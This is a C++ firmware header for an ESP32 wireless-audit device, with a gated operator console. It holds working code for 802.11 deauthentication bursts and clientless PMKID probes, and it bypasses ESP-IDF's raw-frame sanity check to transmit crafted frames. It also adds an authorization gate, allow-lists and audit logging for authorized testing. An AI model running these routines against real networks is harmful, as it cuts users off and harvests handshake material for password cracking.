#pragma once

// Imperative shell for the ESP32 active-offense path: a gated 802.11 deauthentication
// injector plus the operator console that drives it. Compiled into every ESP32 build (like
// the Linux desktop target), it is gated entirely at RUNTIME — the radio stays silent until
// the operator arms + allow-lists a specific BSSID at the serial `sec` console.
//
// Every transmit flows through the same portable, unit-tested authorization gate the Linux
// desktop uses (core/include/zd/secops.hpp + secops_hal.hpp):
//
//   requestDeauth() -> authorize(auth, bssid) -> injector.deauth() only if Allowed
//
// The gate starts DISARMED (operatorConfirmed=false) with an EMPTY allow-list, so even with
// the feature compiled in, the radio stays silent until the operator, at the serial console,
//   1. runs `sec scan`   to discover nearby BSSIDs + channels,
//   2. runs `sec allow <bssid>`  to allow-list a specific target they are authorized to test,
//   3. runs `sec arm I-HAVE-AUTHORIZATION`  to confirm authorization, then
//   4. runs `sec deauth <bssid>` to transmit.
// There is deliberately NO wildcard / "attack-all" command and NOTHING in loop() ever
// injects: offense is strictly operator-initiated and every attempt is audit-logged (Serial
// + a durable NVS counter). Use only against networks you own or are explicitly authorized
// to assess; unauthorized deauthentication is illegal in most jurisdictions.

#include <Arduino.h>
#include <Preferences.h>
#include <WiFi.h>
#include <esp_wifi.h>

#include <atomic>
#include <cstdint>
#include <string>
#include <utility>
#include <vector>

#include "esp32_defensive.hpp"
#include "esp32_sec_cmd.hpp"
#include "zd/dot11.hpp"
#include "zd/hal.hpp"
#include "zd/peering.hpp"
#include "zd/secops.hpp"
#include "zd/secops_hal.hpp"

// --- ESP-IDF raw-frame sanity-check override ----------------------------------------------
//
// Current ESP-IDF rejects crafted management frames from esp_wifi_80211_tx() via an internal
// ieee80211_raw_frame_sanity_check(). Wrapping ONLY that single symbol via
// -Wl,--wrap=ieee80211_raw_frame_sanity_check (in platformio.ini) lets our authorized deauth
// burst scope temporarily bypass the check while forwarding all other callers to __real_.
namespace zd {
namespace esp32_common {
namespace detail {
inline std::atomic<bool> gAllowRawMgmtTx{false};
}  // namespace detail
}  // namespace esp32_common
}  // namespace zd

#ifndef ZD_ESP32_OFFENSIVE_NO_WRAP_DEF
extern "C" int __real_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3);
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    if (zd::esp32_common::detail::gAllowRawMgmtTx.load(std::memory_order_acquire)) {
        return 0;
    }
    return __real_ieee80211_raw_frame_sanity_check(arg, arg2, arg3);
}
#endif

namespace zd {
namespace esp32_common {

// --- Durable audit sink (Serial + NVS monotonic counters & recent TX ring) ----------------
class SerialNvsAuditLog final : public zd::sec::IAuditLog, public IAuditCounters {
public:
    void begin() {
        ready_ = prefs_.begin("zd-sec", /*readOnly=*/false);
        if (!ready_) {
            Serial.println("[SEC-AUDIT] WARN: NVS zd-sec unavailable; ARM & DEAUTH ALLOWED will fail closed");
        }
        txTotal_ = ready_ ? prefs_.getULong("deauth_tx", 0u) : 0u;
        blkTotal_ = ready_ ? prefs_.getULong("deauth_blk", 0u) : 0u;
        pmkidTxTotal_ = ready_ ? prefs_.getULong("pmkid_tx", 0u) : 0u;
        txRingIdx_ = ready_ ? static_cast<uint32_t>(prefs_.getULong("tx_ring_idx", 0u) % 4u) : 0u;
    }

    bool record(const std::string& line) override {
        const std::string safe = zd::sec::sanitizePrintableText(line, 200u);
        Serial.printf("[SEC-AUDIT] %s\n", safe.c_str());
        if (line.rfind("ARM ", 0) == 0 && !ready_) {
            Serial.println("[SEC-AUDIT] ERROR: NVS not ready; blocking unlogged ARM");
            return false;
        }
        // Fail closed if NVS is unavailable for an allowed-transmission audit record.
        if (line.rfind("DEAUTH ALLOWED", 0) == 0) {
            if (!ready_) {
                Serial.println("[SEC-AUDIT] ERROR: NVS not ready; blocking unlogged DEAUTH ALLOWED");
                return false;
            }
            const unsigned long nextTx = txTotal_ + 1u;
            if (prefs_.putULong("deauth_tx", nextTx) == 0u) {
                Serial.println("[SEC-AUDIT] ERROR: NVS write failed; blocking unlogged DEAUTH ALLOWED");
                return false;
            }
            char ringKey[16];
            snprintf(ringKey, sizeof(ringKey), "tx_ring_%u", static_cast<unsigned>(txRingIdx_));
            (void)prefs_.putString(ringKey, safe.c_str());
            txRingIdx_ = (txRingIdx_ + 1u) % 4u;
            (void)prefs_.putULong("tx_ring_idx", static_cast<unsigned long>(txRingIdx_));
            txTotal_ = nextTx;
            return true;
        }
        // A clientless PMKID probe is an active transmit too: fail closed if its allowed
        // attempt cannot be durably recorded, mirroring the deauth guarantee above.
        if (line.rfind("PMKID PROBE ALLOWED", 0) == 0) {
            if (!ready_) {
                Serial.println("[SEC-AUDIT] ERROR: NVS not ready; blocking unlogged PMKID PROBE ALLOWED");
                return false;
            }
            const unsigned long nextTx = pmkidTxTotal_ + 1u;
            if (prefs_.putULong("pmkid_tx", nextTx) == 0u) {
                Serial.println("[SEC-AUDIT] ERROR: NVS write failed; blocking unlogged PMKID PROBE ALLOWED");
                return false;
            }
            pmkidTxTotal_ = nextTx;
            return true;
        }
        if (line.rfind("DEAUTH BLOCKED", 0) == 0 || line.rfind("PMKID PROBE BLOCKED", 0) == 0) {
            ++blkTotal_;
            if (ready_) {
                (void)prefs_.putULong("deauth_blk", blkTotal_);
            }
        }
        return true;
    }

    unsigned long transmittedTotal() const override { return txTotal_; }
    unsigned long blockedTotal() const override { return blkTotal_; }
    unsigned long pmkidProbeTotal() const override { return pmkidTxTotal_; }

private:
    Preferences prefs_;
    bool ready_ = false;
    unsigned long txTotal_ = 0u;
    unsigned long blkTotal_ = 0u;
    unsigned long pmkidTxTotal_ = 0u;
    uint32_t txRingIdx_ = 0u;
};

// --- ESP32 deauthentication injector (implements IOffensiveChannelInjector) ---------------
class Esp32Deauthenticator final : public IOffensiveChannelInjector {
public:
    using RxDrainFn = void (*)(void*);

    bool available() const override { return true; }

    void setRxDrainCallback(RxDrainFn fn, void* ctx) {
        rxDrainFn_ = fn;
        rxDrainCtx_ = ctx;
    }

    void setChannel(int channel) override {
        if (channel >= 1 && channel <= 14) {
            channel_ = channel;
        }
    }

    zd::sec::InjectResult deauth(const std::string& bssid, const std::string& client,
                                 uint32_t count) override {
        zd::sec::InjectResult res;
        res.decision = zd::sec::AuthDecision::Allowed;  // gate already cleared by SecSession

        uint8_t ap[6];
        if (!zd::dot11::parseMac(zd::sec::normalizeMac(bssid).c_str(), ap)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        if (!zd::sec::isValidClientTarget(client)) {
            res.transmitted = false;
            res.detail = "invalid client MAC";
            return res;
        }
        uint8_t sta[6];
        const bool broadcast = client.empty() || zd::sec::isBroadcastMac(zd::sec::normalizeMac(client));
        if (broadcast) {
            for (uint8_t& b : sta) b = 0xFF;
        } else if (!zd::dot11::parseMac(zd::sec::normalizeMac(client).c_str(), sta)) {
            res.transmitted = false;
            res.detail = "bad client MAC";
            return res;
        }

        // Cancel any active passive async pet scan cleanly before switching to promiscuous TX.
        WiFi.scanDelete();
        // Remember whether a defensive promiscuous monitor (gDefMon) was already running so
        // we can hand control back to it afterwards instead of silently disabling it.
        bool wasPromiscuous = false;
        esp_wifi_get_promiscuous(&wasPromiscuous);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_channel(static_cast<uint8_t>(channel_), WIFI_SECOND_CHAN_NONE);

        const uint32_t clamped = count > kMaxBurst ? kMaxBurst : count;
        uint8_t frame[zd::dot11::kMgmtDeauthFrameLen];
        int sent = 0;
        {
            struct RawMgmtTxScope {
                RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(true, std::memory_order_release); }
                ~RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(false, std::memory_order_release); }
            } txScope;
            (void)txScope;
            for (uint32_t i = 0; i < clamped; ++i) {
                // AP -> station (or broadcast): the deauth every station honors.
                const std::size_t n = zd::dot11::buildDeauthFrame(frame, sta, ap, ap);
                if (esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(n), false) == ESP_OK) {
                    ++sent;
                }
                // station -> AP (targeted only), mirroring aireplay-ng's bidirectional kick.
                if (!broadcast) {
                    const std::size_t m = zd::dot11::buildDeauthFrame(frame, ap, sta, ap);
                    if (esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(m), false) == ESP_OK) {
                        ++sent;
                    }
                }
                delay(1);
                drainRx();
            }
        }
        drainRx();

        // Restore the pre-deauth radio state. If the defensive monitor owned promiscuous
        // mode (its RX callback/filter are still installed), leaving it enabled resumes
        // capture seamlessly; only drop back to plain STA when nothing was monitoring.
        esp_wifi_set_promiscuous(wasPromiscuous);
        if (!wasPromiscuous) {
            WiFi.mode(WIFI_STA);
        }

        res.transmitted = sent > 0;
        res.detail = "esp_wifi_80211_tx deauth x" + std::to_string(sent) +
                     " ch" + std::to_string(channel_);
        return res;
    }

    // Clientless PMKID probe: from a throwaway locally-administered STA MAC, send an
    // open-system Authentication then an Association Request bearing an RSN IE, `count`
    // times. The AP's EAPOL M1 reply (possibly carrying an RSN PMKID) is captured by the
    // defensive promiscuous monitor's RX path, with RX ring drains interleaved so M1s are
    // never dropped during multi-attempt bursts. Complements deauth — never a replacement,
    // since WPA3-SAE has no PMKID and PMF blunts deauth.
    zd::sec::InjectResult pmkidProbe(const std::string& bssid, const std::string& ssid,
                                     uint32_t count) override {
        zd::sec::InjectResult res;
        res.decision = zd::sec::AuthDecision::Allowed;  // gate already cleared by SecSession

        uint8_t ap[6];
        if (!zd::dot11::parseMac(zd::sec::normalizeMac(bssid).c_str(), ap)) {
            res.transmitted = false;
            res.detail = "bad BSSID";
            return res;
        }
        uint8_t sta[6];
        zd::dot11::randomStaMac(sta, esp_random());

        WiFi.scanDelete();
        bool wasPromiscuous = false;
        esp_wifi_get_promiscuous(&wasPromiscuous);
        esp_wifi_set_promiscuous(true);  // keep RX up so the solicited M1 is captured
        esp_wifi_set_channel(static_cast<uint8_t>(channel_), WIFI_SECOND_CHAN_NONE);

        const uint32_t clamped = count > kMaxBurst ? kMaxBurst : count;
        uint8_t authFrame[zd::dot11::kAuthFrameLen];
        uint8_t assocFrame[zd::dot11::kMaxAssocReqLen];
        int sent = 0;
        {
            struct RawMgmtTxScope {
                RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(true, std::memory_order_release); }
                ~RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(false, std::memory_order_release); }
            } txScope;
            (void)txScope;
            const std::size_t an = zd::dot11::buildAuthFrame(authFrame, ap, sta);
            const std::size_t cn = zd::dot11::buildAssocRequest(assocFrame, ap, sta, ssid.data(),
                                                                ssid.size());
            for (uint32_t i = 0; i < clamped; ++i) {
                if (esp_wifi_80211_tx(WIFI_IF_STA, authFrame, static_cast<int>(an), false) ==
                    ESP_OK) {
                    ++sent;
                }
                delay(5);  // give the AP time to answer the auth before associating
                drainRx();
                if (esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, static_cast<int>(cn), false) ==
                    ESP_OK) {
                    ++sent;
                }
                delay(5);
                drainRx();
            }
        }
        drainRx();

        esp_wifi_set_promiscuous(wasPromiscuous);
        if (!wasPromiscuous) {
            WiFi.mode(WIFI_STA);
        }

        res.transmitted = sent > 0;
        res.detail = "esp_wifi_80211_tx auth+assoc x" + std::to_string(sent) +
                     " ch" + std::to_string(channel_);
        return res;
    }

    static constexpr uint32_t kMaxBurst = OffensiveConsoleCore::kMaxBurst;

private:
    void drainRx() {
        if (rxDrainFn_ != nullptr) {
            rxDrainFn_(rxDrainCtx_);
        }
    }

    int channel_ = 1;
    RxDrainFn rxDrainFn_ = nullptr;
    void* rxDrainCtx_ = nullptr;
};

// --- Opt-in WiFi peer greeting beacon ------------------------------------------------------
//
// Periodically broadcasts THIS unit's presence (a beacon carrying our vendor IE, see
// zd::peer::buildZeroDayGreetingBeacon) so other ZeroDay units greet it, mirroring how classic
// Pwnagotchi units advertise. DISABLED by default and never auto-enabled: active advertising
// is a transmit, so it stays off until the operator runs `peers advertise on`, consistent with
// the device's no-surprise-transmission posture. This is presence-only (broadcast beacon, no
// association offered) — it is NOT an offensive frame and does not touch the sec auth gate.
class Esp32PeerBeacon {
public:
    void setEnabled(bool on) { enabled_ = on; }
    bool enabled() const { return enabled_; }
    void setIntervalMs(uint32_t ms) { intervalMs_ = (ms < 2000u) ? 2000u : ms; }

    // Emit a greeting beacon if enabled and the interval has elapsed. Returns true if a beacon
    // was transmitted this call. Restores the prior promiscuous/radio state afterwards.
    bool maybeEmit(uint32_t nowMs, const zd::peer::PeerAdvert& advert, int channel) {
        if (!enabled_) {
            return false;
        }
        const uint32_t elapsed = nowMs - lastMs_;
        if (lastMs_ != 0u && elapsed < intervalMs_) {
            return false;
        }
        lastMs_ = (nowMs == 0u) ? 1u : nowMs;

        uint8_t src[6];
        uint8_t raw[6];
        esp_wifi_get_mac(WIFI_IF_STA, raw);
        for (std::size_t i = 0; i < 6; ++i) src[i] = raw[i];

        uint8_t frame[zd::peer::kMaxGreetingBeaconLen];
        const std::size_t n = zd::peer::buildZeroDayGreetingBeacon(frame, src, advert);

        bool wasPromiscuous = false;
        esp_wifi_get_promiscuous(&wasPromiscuous);
        esp_wifi_set_promiscuous(true);
        if (channel >= 1 && channel <= 14) {
            esp_wifi_set_channel(static_cast<uint8_t>(channel), WIFI_SECOND_CHAN_NONE);
        }
        bool sent = false;
        {
            struct RawMgmtTxScope {
                RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(true, std::memory_order_release); }
                ~RawMgmtTxScope() { detail::gAllowRawMgmtTx.store(false, std::memory_order_release); }
            } txScope;
            (void)txScope;
            sent = esp_wifi_80211_tx(WIFI_IF_STA, frame, static_cast<int>(n), false) == ESP_OK;
        }
        esp_wifi_set_promiscuous(wasPromiscuous);
        if (!wasPromiscuous) {
            WiFi.mode(WIFI_STA);
        }
        return sent;
    }

private:
    bool enabled_ = false;
    uint32_t intervalMs_ = 30000u;
    uint32_t lastMs_ = 0u;
};

class Esp32OffensiveScanner final : public IOffensiveScanner {
public:
    void setPetSession(zd::hal::PlatformSession* petSession,
                       zd::hal::IThemeStore* themeStore = nullptr) {
        petSession_ = petSession;
        themeStore_ = themeStore;
    }

    std::string runScan(uint32_t nowMs, zd::sec::SecSession& secSession) override {
        WiFi.scanDelete();
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
        const int16_t count = WiFi.scanNetworks(/*async=*/false, /*show_hidden=*/true);
        if (count <= 0) {
            WiFi.scanDelete();
            if (petSession_ != nullptr && petSession_->state().isScanning) {
                petSession_->dispatch(zd::ScanCompletedEvent{nowMs, {}}, themeStore_);
            }
            return "scan: no networks found\n";
        }
        std::vector<zd::AccessPoint> petAps;
        petAps.reserve(static_cast<std::size_t>(count));
        std::string out = "scan: " + std::to_string(count) + " networks\n";
        for (int16_t i = 0; i < count; ++i) {
            const std::string bssid = zd::sec::normalizeMac(WiFi.BSSIDstr(i).c_str());
            const int32_t ch = WiFi.channel(i);
            const int32_t rssi = WiFi.RSSI(i);
            const bool enc = WiFi.encryptionType(i) != WIFI_AUTH_OPEN;
            const std::string rawSsid(WiFi.SSID(i).c_str());
            const std::string safeSsid = zd::sec::sanitizePrintableText(rawSsid, 32u);
            secSession.dispatch(zd::sec::ApObserved{
                nowMs, bssid, safeSsid, ch, rssi,
                enc ? zd::sec::Encryption::Wpa2 : zd::sec::Encryption::Open, false});
            petAps.push_back(zd::AccessPoint{rawSsid, rssi, ch, enc});
            char ln[128];
            snprintf(ln, sizeof(ln), "  %s ch%-3d %4ddBm %s %.32s\n", bssid.c_str(),
                     static_cast<int>(ch), static_cast<int>(rssi), enc ? "ENC " : "OPEN",
                     safeSsid.c_str());
            out += ln;
        }
        WiFi.scanDelete();
        if (petSession_ != nullptr) {
            petSession_->dispatch(zd::ScanCompletedEvent{nowMs, std::move(petAps)}, themeStore_);
        }
        return out;
    }

private:
    zd::hal::PlatformSession* petSession_ = nullptr;
    zd::hal::IThemeStore* themeStore_ = nullptr;
};

// --- Operator console (wraps pure OffensiveConsoleCore + ESP32 hardware adapters) ----------
class OffensiveConsole {
public:
    void begin() { audit_.begin(); }

    std::string handleLine(const std::string& line,
                           uint32_t nowMs,
                           zd::hal::PlatformSession* petSession = nullptr,
                           zd::hal::IThemeStore* themeStore = nullptr,
                           Esp32DefensiveMonitorCore* defMonCore = nullptr) {
        struct DrainCtx {
            Esp32DefensiveMonitorCore* defMonCore;
            zd::sec::SecSession* sec;
            zd::hal::PlatformSession* pet;
            zd::hal::IThemeStore* themeStore;
        } drainCtx{defMonCore, &core_.mutableSession(), petSession, themeStore};

        auto drainFn = [](void* raw) {
            auto* ctx = static_cast<DrainCtx*>(raw);
            if (ctx != nullptr && ctx->defMonCore != nullptr && ctx->sec != nullptr) {
                ctx->defMonCore->step(*ctx->sec, static_cast<uint32_t>(millis()),
                                      ctx->pet, ctx->themeStore);
            }
        };
        if (defMonCore != nullptr) {
            injector_.setRxDrainCallback(+drainFn, &drainCtx);
        } else {
            injector_.setRxDrainCallback(nullptr, nullptr);
        }
        scanner_.setPetSession(petSession, themeStore);
        std::string out = core_.handleLine(line, nowMs);
        scanner_.setPetSession(nullptr, nullptr);
        injector_.setRxDrainCallback(nullptr, nullptr);
        if (petSession != nullptr) {
            if (petSession->state().isScanning && WiFi.scanComplete() != WIFI_SCAN_RUNNING) {
                petSession->dispatch(zd::ScanCompletedEvent{nowMs, {}}, themeStore);
            }
            if (core_.isArmed() != petSession->state().offensiveArmed) {
                petSession->dispatch(zd::SetOffensiveArmedEvent{nowMs, core_.isArmed()}, themeStore);
            }
        }
        return out;
    }

    bool isArmed() const { return core_.isArmed(); }
    const zd::sec::SecSession& session() const { return core_.session(); }
    zd::sec::SecSession& mutableSession() { return core_.mutableSession(); }

private:
    Esp32Deauthenticator injector_;
    SerialNvsAuditLog audit_;
    Esp32OffensiveScanner scanner_;
    OffensiveConsoleCore core_{injector_, audit_, scanner_, &audit_};
};

}  // namespace esp32_common
}  // namespace zd
